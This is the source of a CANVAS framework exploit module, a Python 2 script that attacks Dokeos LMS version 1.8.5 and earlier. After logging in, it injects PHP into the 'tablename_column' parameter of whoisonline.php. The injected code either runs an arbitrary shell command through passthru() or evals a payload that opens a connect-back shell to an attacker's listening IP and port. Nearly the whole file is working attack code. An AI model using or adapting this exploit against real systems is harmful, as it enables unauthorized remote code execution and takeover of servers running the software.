#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re

NAME="Dokeos LMS <= 1.8.5 Remote Code Execution"
DESCRIPTION="Dokeos LMS <= 1.8.5 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Dokeos"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="None"
DOCUMENTATION["CVE Url"]="None"
DOCUMENTATION["References"]=["http://osvdb.org/53888"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Requires at least one user to be logged in.
"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.basepath="/"
        self.basepaths=["/dokeos-1.8.5/","/dokeos/","/lms/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["dokeos"]
        self.testfile="index.php"

        return 

    def request1(self):

        self.log("[+] Logging In")
	ret =""
        data={}
        data["username"]=self.user
        data["password"]=self.password

        data=self.UA.POST("login.php",data=data)
        self.log("Data=%s"%data)

        self.log("[+] Sending Exploit Data")

        if self.command:
            self.log("[+] Command: %s"%self.command)

            command=self.command
            command=self.conv(command).strip()

	    expl = "0];}error_reporting(0);print(startz);passthru("+command+");print(endz);die;/*"
            data = self.UA.GET("whoisonline.php?tablename_column=%s"%(expl)) 

            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                self.log("Command result: %s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef()
            command=self.conv(command)

            self.log("[+] Command: %s"%command)

            expl = "0];}eval("+command+");/*"
            data = self.UA.GET("whoisonline.php?tablename_column=%s"%(expl))
            self.log("Data=%s"%data)
            self.log("[+] Looking for PHP connectback")

            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/dokeos/   [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
